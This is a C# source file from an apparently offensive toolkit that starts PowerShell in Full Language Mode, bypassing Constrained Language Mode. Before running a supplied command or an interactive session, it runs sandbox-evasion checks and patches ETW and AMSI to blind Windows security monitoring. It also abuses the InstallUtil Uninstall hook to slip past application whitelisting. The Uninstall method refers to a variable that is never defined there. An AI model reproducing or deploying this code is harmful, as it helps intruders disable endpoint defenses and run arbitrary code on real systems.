using static NetRunners.Clm.Command;
using NetRunners.Heuristics;
using NetRunners.Patchers;

namespace NetRunners.Clm
{
    class Program
    {
        /// <summary>
        /// Launches a Powershell session in Full Language Mode, bypassing CLM.
        /// </summary>
        /// <param name="args">Powershell command to execute in Full Language Mode. Use single quotes around command or run from cmd if special characters are breaking execution.</param>

        static void Main(string[] args)
        {
            if (!SleepHeuristic.Check() || !NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
            {
                return; // Exit if any checks fail or patching fails
            }
            
            string cmd = args.Length == 1 ? args[0] : string.Empty;

            if (cmd != string.Empty)
            {
                Command.Execute(cmd);
            }
            else
            {
                BypassClm();
            }
        }
    }

    /// <summary>
    /// Add InstallUtil support.
    /// </summary>
    [System.ComponentModel.RunInstaller(true)]      // add installutil support
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            if (!SleepHeuristic.Check() || !NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
            {
                return; // Exit if any checks fail or patching fails
            }
            // uncomment choice 
            //BypassClm();            // interactive powershell session
            Command.Execute(cmd);   // bypass clm, exec command
        }
    }
}
